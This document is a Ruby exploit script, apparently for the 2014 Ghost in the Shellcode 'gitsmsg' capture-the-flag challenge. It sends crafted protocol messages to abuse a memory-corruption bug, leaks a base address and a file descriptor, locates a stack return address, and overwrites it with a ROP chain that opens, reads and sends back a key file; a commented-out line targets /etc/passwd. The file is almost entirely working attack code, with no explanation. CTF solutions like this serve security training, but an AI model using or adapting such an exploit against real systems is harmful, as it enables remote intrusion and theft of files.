require 'socket'
require 'timeout'

MESSAGE_LOGIN        = 0x01
MESSAGE_DELETE       = 0x02
MESSAGE_STORE        = 0x04
MESSAGE_GET          = 0x05
MESSAGE_SEND_QUEUED  = 0x07
MESSAGE_EDIT         = 0x08
MESSAGE_QUIT         = 0x09

VARDATA_TYPE_BYTE         = 0x10
VARDATA_TYPE_INT          = 0x11
VARDATA_TYPE_DOUBLE       = 0x12
VARDATA_TYPE_BYTE_ARRAY   = 0x13
VARDATA_TYPE_INT_ARRAY    = 0x14
VARDATA_TYPE_DOUBLE_ARRAY = 0x15
VARDATA_TYPE_STRING       = 0x16

@@sent = 0

def get_int(s, context = "?")
  int = s.recv(4)

  if(int.nil? || int.length != 4)
    puts("Receive failed :: #{context}");
    exit
  end

  return int.unpack("I").pop
end

def receive_code(s, expected, context)
  code = get_int(s, context)

  if(code != expected)
    puts("Error! Unexpected response: 0x%08x :: %s" % [code, context])
    exit
  end

  #puts("Success: %08x :: %s" % [code, context])
end

def login(s, username = ("A" * 10) + "\0" + "A" * (0x100 - 11))
  out = [MESSAGE_LOGIN, username].pack("Ia*")
  s.write(out)
  receive_code(s, 0x00001001, "login")
end

def send_queued(s)
  out = [MESSAGE_SEND_QUEUED].pack("I")
  s.write(out)

  0.upto(@@sent-1) do
    receive_code(s, 0x00001006, "send_queued")
  end
  receive_code(s, 0x00001004, "send_queued_finished")
end

# Sends a 0x04 message (store)
def store(s, vardata_type, vardata, to_username = ("B" * 10) + "\0" + "B" * (0x100 - 11))
  @@sent += 1
  out = [MESSAGE_STORE, to_username].pack("Ia*")

  if(vardata_type == VARDATA_TYPE_BYTE)
    out += [1, vardata_type, vardata].pack("IIC")
  elsif(vardata_type == VARDATA_TYPE_INT)
    out += [4, vardata_type, vardata].pack("III")
  elsif(vardata_type == VARDATA_TYPE_DOUBLE)
    out += [8, vardata_type, vardata].pack("IIQ")
  elsif(vardata_type == VARDATA_TYPE_BYTE_ARRAY)
    out += [vardata.length, vardata_type].pack("II")
    out += vardata.pack("C*")
  elsif(vardata_type == VARDATA_TYPE_INT_ARRAY)
    out += [vardata.length, vardata_type].pack("II")
    out += vardata.pack("I*")
  elsif(vardata_type == VARDATA_TYPE_DOUBLE_ARRAY)
    out += [vardata.length, vardata_type].pack("II")
    out += vardata.pack("Q*")
  elsif(vardata_type == VARDATA_TYPE_STRING)
    out += [1, vardata_type, vardata].pack("III")
  else
    puts("wat")
    exit
  end

  s.write(out)
  receive_code(s, 0x00001004, "store")
end

def edit_array(s, id, index, new_data)
  out = [MESSAGE_EDIT, id, index, new_data].pack("IIIa*")
  s.write(out)

  receive_code(s, 0x00001004, "edit")
end

def get(s, id)
  out = [MESSAGE_GET, id].pack("II")
  s.write(out)

  type = get_int(s)
  len = get_int(s)

  #puts("Retrieving #{len} bytes")
  data = s.recv(len)

  receive_code(s, 0x00001004, "get")
  return data

end

def delete(s, id)
  out = [MESSAGE_DELETE, id].pack("II")
  s.write(out)
  receive_code(s, 0x00001004, "delete")
end

def quit(s)
  s.write([MESSAGE_QUIT].pack("I"))
  receive_code(s, 0x00001003, "quit")
end

def read_dword(s, addr)

end

def hide_data(s, data)
  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)
  store(s, VARDATA_TYPE_BYTE_ARRAY, data.bytes.to_a)

  result = get(s, 1)[24..27].unpack("I").pop

  puts("'%s' stored at 0x%08x" % [data, result])

  return result
end

# We're searching for this
START_SEARCH   = 0xbf800000
END_SEARCH     = 0xBFFFFFFF
CHUNK_SIZE     = END_SEARCH - START_SEARCH

# Pop pop pop ret
PPPR = 0x00002755

# Pop pop ret
PPR  = 0x00002756

# Pop ret
PR   = 0x00002757

def find_return_address(s, address_to_find, file_path, base, fd)
  address_to_find = [address_to_find].pack("I")

  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)
  store(s, VARDATA_TYPE_INT_ARRAY, [0x41414141] * 0xf0)

  puts("Trying to read 0x%08x - 0x%08x..." % [START_SEARCH, END_SEARCH])
  edit_array(s, 1, 3, [START_SEARCH, CHUNK_SIZE / 4].pack("II"))

  out = [MESSAGE_GET, 0].pack("II")
  s.write(out)
  type = get_int(s)
  len = get_int(s)
  puts("Retrieving #{len} bytes")
  result = ""

  while(result.length < len)
    result = result + s.recv(END_SEARCH - START_SEARCH + 1)
    if(loc = result.index(address_to_find))
      return START_SEARCH + loc
    end
  end

  puts("Couldn't find the return address :(")
  exit
end

def change_return_address(s, return_address, file_path, base, fd)

    puts("Attempting to ROP-read the key file...")
    stack = [
      base+0xc90, # open()
      base+PPR,        # open return addr
      file_path,  # filename = value we created
      0,          # flags

      base+0xb60, # read()
      base+PPPR,
      0,          # fd
      file_path,  # buf
      100,        # count

      base+0xce0, # write()
      base+PPPR,
      fd,         # fd
      file_path,  # buf
      100,        # count

      base+0x2350
    ]

    0.upto(stack.size - 1) do |i|
      entry = [stack[i]].pack("I")
      edit_array(s, 1, 3, [return_address - (i * 4), 1].pack("II"))
      edit_array(s, 1, 3, [return_address + (i * 4), 1].pack("II"))
      edit_array(s, 0, 0, entry)
    end
end

def get_base_address(s)
  # Leak the address of an impotant variable
  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x4444444444444444]*4)
  store(s, VARDATA_TYPE_STRING, 0)
  addr = get(s, 1)[0x18..0x1b].unpack("I").pop
  addr = addr - 0x2bb0

  return addr
end

def get_fd(s, base)
  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)
  store(s, VARDATA_TYPE_INT_ARRAY, [0x41414141] * 0xf0)

  edit_array(s, 1, 3, [base+0x5164, 1].pack("II"))
  return get(s, 0).unpack("I").pop
end

#s = TCPSocket.new("localhost", 8585)
s = TCPSocket.new("gitsmsg.2014.ghostintheshellcode.com", 8585)

puts("Initializing")
receive_code(s, 0x00001000, "init")

puts("Logging in")
login(s)

#file_path = hide_data(s, "/etc/passwd\0" + ("A"*100))
file_path = hide_data(s, "/home/gitsmsg/key\0" + ("A"*100))

base_addr = get_base_address(s)
puts("Found base address = 0x%08x" % base_addr)

puts("Retrieving the file descriptor from memory")
fd = get_fd(s, base_addr)
puts("... it's #{fd}!")

address_to_overwrite = base_addr + 0x0e74
puts("Searching the stack for 0x%08x" % address_to_overwrite)

return_address = find_return_address(s, address_to_overwrite, file_path, base_addr, fd)
puts("Found return address @ 0x%08x" % return_address)

change_return_address(s, return_address, file_path, base_addr, fd)

puts("Quitting")
quit(s)

loop do
  a = s.recv(100)
  if(a.nil? || a == "")
    exit
  end
  puts(a)
end
